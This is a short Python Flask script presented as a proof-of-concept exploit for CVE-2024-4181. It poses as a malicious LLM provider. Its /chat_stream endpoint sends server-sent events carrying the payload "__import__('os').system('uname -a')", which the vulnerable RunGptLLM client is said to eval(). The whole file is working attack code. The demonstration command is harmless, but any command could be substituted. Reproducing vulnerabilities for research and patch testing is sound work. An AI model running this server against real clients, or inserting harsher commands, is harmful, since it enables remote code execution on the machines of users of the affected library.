#!/usr/bin/env python3
"""
CVE-2024-4181 Malicious LLM Provider Server
This simulates a compromised LLM hosting provider that sends command injection payloads
"""
from flask import Flask, Response
import time

app = Flask(__name__)

def generate_sse_events():
    """
    Generate SSE events with command injection payloads.
    The vulnerable RunGptLLM client will eval() these payloads.
    """
    event_id = 1
    while True:
        # Payload: Command injection via eval()
        data = "__import__('os').system('uname -a')"
        yield f"id: {event_id}\ndata: {data}\nevent: time_update\n\n"
        event_id += 1
        time.sleep(1)  # Delay to simulate real-time events

@app.route('/chat_stream', methods=['POST'])
def sse_request():
    return Response(generate_sse_events(), content_type='text/event-stream')

@app.route('/health', methods=['GET'])
def health():
    return {"status": "ok", "server": "malicious-llm-provider"}

if __name__ == '__main__':
    print("\n" + "="*70)
    print("CVE-2024-4181 Malicious LLM Provider")
    print("="*70)
    print("Listening on: 0.0.0.0:5000")
    print("Endpoint: POST /chat_stream")
    print("="*70)
    print()
    app.run(debug=False, port=5000, host='0.0.0.0')
